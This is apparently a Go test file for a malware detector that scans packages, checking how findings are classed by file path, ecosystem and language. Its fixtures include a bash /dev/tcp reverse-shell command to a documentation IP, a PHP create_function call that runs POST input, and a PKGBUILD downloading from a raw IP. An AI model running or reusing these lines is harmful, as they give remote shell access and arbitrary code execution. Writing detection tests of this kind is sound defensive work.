package detect

import "testing"

// classOfID returns the class of the first finding with id, or "" when none fired.
func classOfID(fs []Finding, id string) Class {
	for _, f := range fs {
		if f.ID == id {
			return f.Class
		}
	}
	return ""
}

func libScan(eco, content string) []Finding {
	return Detect(ctxFixture(eco, content))
}

const revshell = "\tcmd := exec.Command(\"bash\", \"-c\", \"bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\")\n"

// A hit only in a test, testdata, doc, example or CI file is the package's data, not its
// behaviour: context for every rule, override_gate included. The same line in a file that runs
// stays evidence.
func TestFileViewNonSurfaceFilesAreContext(t *testing.T) {
	for _, file := range []string{
		"github.com/x/y@v1.0.0/detect/revshell_test.go",
		"github.com/x/y@v1.0.0/testdata/shells.txt",
		"pkg-1.0/tests/test_detect.py",
		"package/src/__tests__/scan.test.js",
		"crate-1.0/README.md",
		"crate-1.0/examples/listener.rs",
		"repo/.github/workflows/ci.yml",
	} {
		content := "// ==== main.go ====\npackage y\n\n// ==== " + file + " ====\n" + revshell
		if got := classOfID(libScan("go", content), "P-REVSHELL-DEVTCP"); got != ClassContext {
			t.Errorf("%s: P-REVSHELL-DEVTCP class %q, want context", file, got)
		}
	}
	content := "// ==== github.com/x/y@v1.0.0/repair.go ====\n" + revshell + "// ==== github.com/x/y@v1.0.0/repair_test.go ====\n" + revshell
	fs := libScan("go", content)
	if got := classOfID(fs, "P-REVSHELL-DEVTCP"); got != ClassEvidence {
		t.Fatalf("reverse shell in repair.go: class %q, want evidence", got)
	}
	for _, f := range fs {
		if f.ID == "P-REVSHELL-DEVTCP" && f.MatchedLine == "" {
			t.Error("the evidence line must come from the file that runs")
		}
	}
}

// Content with no markers (a lone PKGBUILD, one file scanned by the CLI) is judged whole.
func TestFileViewNoMarkersUnchanged(t *testing.T) {
	if got := classOfID(libScan("go", revshell), "P-REVSHELL-DEVTCP"); got != ClassEvidence {
		t.Errorf("unmarked content: class %q, want evidence", got)
	}
}

// node_modules/ is loaded at runtime on npm (bundledDependencies) and vendor/ on packagist; on
// other registries both are copies the consumer never loads.
func TestFileViewVendoredCopies(t *testing.T) {
	cases := []struct {
		eco, file string
		want      Class
	}{
		{"npm", "package/node_modules/helper/index.js", ClassEvidence},
		{"cargo", "crate-1.0/web/node_modules/helper/index.js", ClassContext},
		{"packagist", "acme/lib/vendor/autoload_real.php", ClassEvidence},
		{"go", "github.com/x/y@v1.0.0/vendor/github.com/z/z.go", ClassContext},
		{"pypi", "pkg-1.0/.yarn/releases/yarn-4.1.0.cjs", ClassContext},
	}
	for _, c := range cases {
		content := "// ==== " + c.file + " ====\n" + revshell
		if got := classOfID(libScan(c.eco, content), "P-REVSHELL-DEVTCP"); got != c.want {
			t.Errorf("%s %s: class %q, want %q", c.eco, c.file, got, c.want)
		}
	}
}

// A language-specific rule judges only files in its language. mlua's create_function in a Rust
// file is not PHP (audit 2026-10-25); the same call in a .php file still fires.
func TestFileViewLanguageScope(t *testing.T) {
	line := "    let f = lua.create_function(|_, $x: i32| Ok(x))?;\n"
	if has(libScan("cargo", "// ==== mlua-1.0/src/lib.rs ====\n"+line), "PHP-CREATE-FUNCTION") {
		t.Error("PHP-CREATE-FUNCTION fired in a .rs file")
	}
	php := "$f = create_function('$a', $_POST['code']);\n"
	if !has(libScan("packagist", "// ==== acme/src/x.php ====\n"+php), "PHP-CREATE-FUNCTION") {
		t.Error("PHP-CREATE-FUNCTION no longer fires in a .php file")
	}
	if !has(libScan("packagist", php), "PHP-CREATE-FUNCTION") {
		t.Error("PHP-CREATE-FUNCTION must still judge unmarked content")
	}
}

func TestPathMatchesAndNonSurface(t *testing.T) {
	if !pathMatches("a/b/go.mod", []string{"go.mod"}) || pathMatches("a/b/go.mod.bak", []string{"go.mod"}) {
		t.Error("base-name match")
	}
	if !pathMatches(`a\b\X.PHP`, []string{".php"}) {
		t.Error("extension match is case-insensitive and takes Windows separators")
	}
	for _, p := range []string{"x/test_util.py", "x/foo_spec.rb", "x/a.spec.ts", "x/go.sum", "x/composer.lock", "x/docs/guide.html", "x/CHANGELOG.md"} {
		if !nonSurfacePath(p, "pypi") {
			t.Errorf("%s should not be a surface", p)
		}
	}
	for _, p := range []string{"x/src/testing_utils.py", "x/lib/contest.rb", "x/bin/install.sh", "x/setup.py", "x/latest/index.js"} {
		if nonSurfacePath(p, "pypi") {
			t.Errorf("%s should be a surface", p)
		}
	}
}

// P-APK-SOURCE-RAW-IP is a recipe rule (APKBUILD and PKGBUILD share the source= array). It fired
// on Python and Rust library strings; it still fires on a PKGBUILD that downloads from an address.
func TestAPKSourceRawIPScope(t *testing.T) {
	pkgbuild := `source=("https://github.com/ppy/osu/releases/download/v1/osu.AppImage" "http://162.19.230.104:2069/builds/osu")`
	if !has(Detect(&PackageContext{Name: "p", Ecosystem: "aur", PkgbuildContent: pkgbuild, PkgbuildExecutes: true}), "P-APK-SOURCE-RAW-IP") {
		t.Error("lost on an AUR PKGBUILD")
	}
	if has(libScan("pypi", `app.camera("lobby", source="http://192.168.1.40/snapshot.jpg")`), "P-APK-SOURCE-RAW-IP") {
		t.Error("fired on python library source")
	}
}
